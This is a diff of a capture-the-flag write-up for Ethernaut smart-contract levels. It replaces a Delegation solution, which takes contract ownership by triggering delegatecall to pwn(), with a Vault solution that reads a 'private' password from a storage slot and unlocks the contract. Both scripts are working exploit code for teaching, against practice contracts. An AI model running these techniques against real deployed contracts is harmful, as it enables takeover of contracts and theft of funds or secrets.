@@ -1,16 +1,18 @@
 ---
-description: >-
-  In Ethernaut's Delegation, we see an example of one contract calling another
-  via Solidity's delegatecall method.
+description: In Ethereum's vault, we look at how "private" on-chain data really is.
 ---
 
-# 6 - Delegation
+# 8 - Vault
+
+### Notes
+
+Variables are stored in "slots" - often slot index position starting from 0, by variable, but Ethereum tries to make storage as efficient as possible and may mix this up.
 
 ### Scripted Solution
 
 ```javascript
-const ethers = require('ethers')
 const fs = require('fs')
+const ethers = require('ethers')
 require('dotenv').config({ path: './.env' })
 
 /**
@@ -40,29 +42,29 @@ async function setup(contractName) {
  */
 async function main() {
   // Get Ethers objects needed to interact with the blockchain and contract
-  const { playerWalletSigner, contract: delegationContract } = await setup(
-    'Delegation'
+  const { provider, contract: vaultContract } = await setup('Vault')
+
+  // Get contract `locked` variable
+  console.log(`Contract locked: ${await vaultContract.locked()}.`)
+
+  // Get `password` from contract storage slot
+  console.log('Getting password from contract storage...')
+  const passwordSlot = 1
+  const password = await provider.getStorageAt(
+    vaultContract.address,
+    passwordSlot
   )
-
-  console.log(`Delegation contract owner: ${await delegationContract.owner()}`)
-
-  // Method id: first four bytes of the keccak256 hash of the function signature
-  const pwnMethodId = ethers.utils.id('pwn()').substring(0, 10)
-
-  // Trigger 'Delegation' fallback function and call pwn() on 'Delegate'
-  console.log('Sending transaction to trigger fallback and call pwn()...')
-  const delegationFallbackTx = await playerWalletSigner.sendTransaction({
-    to: process.env.CONTRACT_ADDRESS,
-    gasLimit: 1000000,
-    gasPrice: 20000000000,
-    data: pwnMethodId,
-  })
-  await delegationFallbackTx.wait(1)
-
-  // Confirm contract owner is now player address
   console.log(
-    `Delegation contract owner now: ${await delegationContract.owner()}`
+    `Password to utf-8 string: ${ethers.utils.toUtf8String(password)}`
   )
+
+  // Unlock vault by calling `unlock` with password
+  console.log('Unlocking vault with password...')
+  const vaultUnlock = await vaultContract.unlock(password)
+  vaultUnlock.wait(1)
+
+  // Confirm vault is unlocked
+  console.log(`Contract locked: ${await vaultContract.locked()}.`)
 }
 
 main()
